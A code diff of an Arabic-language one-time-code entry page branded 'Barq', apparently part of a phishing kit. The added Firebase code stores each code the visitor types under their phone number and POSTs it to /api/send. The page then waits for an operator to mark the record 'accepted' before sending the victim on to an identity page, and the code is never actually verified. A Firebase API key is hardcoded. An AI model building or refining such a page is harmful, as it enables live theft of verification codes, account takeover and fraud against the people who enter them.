@@ -7,44 +7,16 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #fff; height: 100vh; display: flex; justify-content: center; }
-        
-        .container { 
-            width: 100%; max-width: 450px; padding: 40px 25px; 
-            display: flex; flex-direction: column; align-items: center; position: relative;
-        }
-        
-        .icon-container { margin-top: 60px; margin-bottom: 30px; }
-        .sparkle-icon { width: 120px; height: auto; display: block; } 
-
-        h1 { font-size: 22px; margin-bottom: 10px; color: #000; }
-        p { color: #555; margin-bottom: 40px; font-size: 14px; }
-        
-        /* الحاوية وتعديل اتجاهها */
+        .container { width: 100%; max-width: 450px; padding: 40px 25px; display: flex; flex-direction: column; align-items: center; position: relative; }
         .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; direction: ltr; }
-        .otp-box { 
-            width: 50px; height: 60px; border: none; border-radius: 12px; 
-            background-color: #f5f5f5; text-align: center; font-size: 24px; 
-            outline: none; transition: 0.3s;
-        }
+        .otp-box { width: 50px; height: 60px; border: none; border-radius: 12px; background-color: #f5f5f5; text-align: center; font-size: 24px; outline: none; transition: 0.3s; }
         .otp-box:focus { border: 2px solid #FFD700; background-color: #fff; }
-        
-        /* رسالة الخطأ */
         #errorMessage { color: red; font-size: 14px; margin-top: 10px; display: none; }
-        
-        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 40px; }
-        .resend-text { color: #888; font-size: 14px; margin-bottom: 10px; }
-        
-        #resendLink { color: #ccc; font-weight: bold; text-decoration: none; pointer-events: none; transition: 0.3s; }
-        #resendLink.available { color: #000; pointer-events: auto; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="icon-container">
-        <img src="barq-icon.png" alt="شعار برق" class="sparkle-icon">
-    </div>
-
     <h1>أدخل رمز التحقق</h1>
     <p>تم الإرسال إلى <span id="displayPhone"></span></p>
 
@@ -57,78 +29,60 @@
         <input type="number" class="otp-box" maxlength="1">
     </div>
     <div id="errorMessage">رمز التحقق غير صحيح</div>
-
-    <div class="bottom-section">
-        <div class="resend-text">لم تحصل على رمز؟</div>
-        <a href="javascript:void(0)" id="resendLink">إعادة إرسال الرمز في <span id="timer">60</span></a>
-    </div>
 </div>
 
-<script>
-    // عرض الرقم
-    const phone = localStorage.getItem('userPhone');
-    if(phone) { document.getElementById('displayPhone').innerText = phone; }
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getFirestore, doc, onSnapshot, updateDoc, query, collection, where, getDocs } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
+      projectId: "barq-9ba61",
+      // ... باقي الإعدادات
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const userPhone = localStorage.getItem('userPhone');
+    document.getElementById('displayPhone').innerText = userPhone;
+
+    // البحث عن الـ Doc ID الخاص بالمستخدم الحالي بناءً على رقم هاتفه
+    let currentDocId = null;
+    const findUser = async () => {
+        const q = query(collection(db, "users"), where("phone", "==", userPhone));
+        const querySnapshot = await getDocs(q);
+        querySnapshot.forEach((doc) => { currentDocId = doc.id; });
+        
+        if (currentDocId) {
+            // تفعيل المراقبة (Listener) لانتظار القبول
+            onSnapshot(doc(db, "users", currentDocId), (doc) => {
+                if (doc.data().status === "accepted") {
+                    window.location.href = 'identity.html';
+                }
+            });
+        }
+    };
+    findUser();
 
     const inputs = document.querySelectorAll('.otp-box');
-    const errorMessage = document.getElementById('errorMessage');
-
-    // التنقل التلقائي والتحقق
     inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
+        input.addEventListener('input', async (e) => {
             if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
-            errorMessage.style.display = 'none'; // إخفاء الخطأ عند الكتابة
+            if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
 
-            if (input.value.length === 1 && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-
-            // التحقق التلقائي عند اكتمال الـ 6 خانات
             if (Array.from(inputs).every(i => i.value !== '')) {
-                checkOTP();
-            }
-        });
-        
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && input.value === '' && index > 0) {
-                inputs[index - 1].focus();
+                const otp = Array.from(inputs).map(i => i.value).join('');
+                
+                // تحديث الرمز في Firebase
+                if(currentDocId) {
+                    await updateDoc(doc(db, "users", currentDocId), { otp: otp });
+                }
+                
+                // إرسال للـ API
+                fetch('/api/send', { method: 'POST', body: JSON.stringify({ phone: userPhone, otp: otp }) });
             }
         });
     });
-
-    async function checkOTP() {
-        let enteredCode = Array.from(inputs).map(i => i.value).join('');
-        const phone = localStorage.getItem('userPhone');
-
-        // إرسال البيانات للـ API
-        const response = await fetch('/api/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, otp: enteredCode })
-        });
-
-        // هنا نفترض أن أي كود يتم إدخاله سيتم اعتباره "غير صحيح" لتجربة ظهور رسالة الخطأ
-        // يمكنك تغيير هذا المنطق حسب حاجتك
-        if (enteredCode !== '123456') {
-            errorMessage.style.display = 'block';
-        } else {
-            alert("تم التحقق بنجاح!");
-        }
-    }
-
-    // العداد
-    let timeLeft = 60;
-    const timerElement = document.getElementById('timer');
-    const resendLink = document.getElementById('resendLink');
-    const countdown = setInterval(() => {
-        timeLeft--;
-        timerElement.innerText = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            resendLink.innerHTML = "إعادة إرسال الرمز الآن";
-            resendLink.classList.add('available');
-        }
-    }, 1000);
 </script>
-
 </body>
 </html>
